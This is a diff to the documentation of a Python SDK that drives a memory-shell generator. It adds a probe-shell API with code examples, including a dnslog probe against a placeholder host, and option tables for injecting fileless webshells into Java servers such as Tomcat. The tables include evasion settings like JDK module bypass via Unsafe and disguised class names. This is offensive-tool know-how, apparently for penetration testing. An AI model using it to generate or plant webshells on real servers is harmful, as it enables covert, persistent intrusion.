@@ -88,6 +88,9 @@ Constructor args:
 | `get_packers_tree()` | Available packer tree |
 | `get_command_configs()` | Command tool encryptors / implementations |
 | `generate(body=None, **kwargs)` | Generate + pack; returns full JSON |
+| `generate_probe(body=None, **kwargs)` | Generate a probe shell + pack; returns full JSON |
+
+`generate(probe=True)` is only the memory-shell **echo-probe flag** (wrap the injector in an echo shell for remote verify). `generate_probe` calls a separate `POST /api/probe/generate` API and produces a probe shell, not the same artifact.
 
 ### Discover then generate (recommended)
 
@@ -182,7 +185,7 @@ client.generate(
 | `debug` | shellConfig.debug | Injector prints inject info; shell prints stack traces |
 | `by_pass_java_module` | shellConfig.byPassJavaModule | Bypass JDK9+ modules via Unsafe defineClass |
 | `shrink` | shellConfig.shrink | Shrink bytecode (ASM SKIP_DEBUG); default True |
-| `probe` | shellConfig.probe | Wrap injector in a probe shell for remote verify |
+| `probe` | shellConfig.probe | Memory-shell echo-probe flag (not `generate_probe`) |
 | `lambda_suffix` | shellConfig.lambdaSuffix | Append `$Proxy0$$Lambda$1` to class names |
 | `url_pattern` | injectorConfig.urlPattern | Mount/match URL; default `/*` |
 | `injector_class_name` | injectorConfig.injectorClassName | Injector FQCN; empty = random |
@@ -231,6 +234,38 @@ from wtfutil.memshellutil import extract_generate_meta
 
 meta = extract_generate_meta(result)
 # shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
+```
+
+---
+
+## generate_probe: probe shells
+
+`generate_probe` calls `POST /api/probe/generate`. Defaults match the official probe page: `method=ResponseBody`, `content=Command`, `shrink=True`, `static_initialize=True`, `seconds=5`, `server=Tomcat`. `jre` conversion matches `generate` (default 6; class ≥53 auto-sets `byPassJavaModule=True`).
+
+`method` / `content` are case-insensitive within known names. The SDK does **not** validate pairings; illegal combos come back as `MemShellPartyError`. Empty `host` / `req_param_name` / `command_template` are omitted from JSON.
+
+```python
+from wtfutil.memshellutil import MemShellParty, extract_probe_meta
+
+with MemShellParty() as client:
+    result = client.generate_probe(
+        method="ResponseBody",
+        content="Command",
+        jre=9,
+    )
+    payload = result["packResult"]
+    info = result["probeShellResult"]
+    print(info["shellClassName"], info["shellSize"])
+    meta = extract_probe_meta(result)
+```
+
+Build the request without sending:
+
+```python
+from wtfutil.memshellutil import build_probe_body
+
+req = build_probe_body(method="dnslog", content="server", host="x.example.test", jre=9)
+result = client.generate_probe(body=req)
 ```
 
 ---
@@ -336,10 +371,12 @@ Typical causes include an illegal combination, unreachable host, non-JSON respon
 | `KNOWN_SERVERS` / `KNOWN_SHELL_TOOLS` / `KNOWN_SHELL_TYPES` | Known names for case folding |
 | `canonicalize_server` / `canonicalize_shell_tool` / `canonicalize_shell_type` | Standalone normalizers |
 | `memshell_config` | Runtime config dict (`BASE_URL`) |
-| `build_generate_body(...)` | Build request body only (no HTTP) |
+| `build_generate_body(...)` | Build a memory-shell request body only (no HTTP) |
+| `build_probe_body(...)` | Build a probe-shell request body only (no HTTP) |
 | `resolve_jre_class_version(...)` | Normalize release or class major to API number |
 | `resolve_shell_credentials(...)` | Map `password`/`key` to tool-specific fields |
 | `extract_generate_meta(result, output=...)` | Compact meta from a generate response |
+| `extract_probe_meta(result, output=...)` | Compact meta from a generate_probe response |
 | `MemShellPartyError` | API / protocol errors |
 
 ---
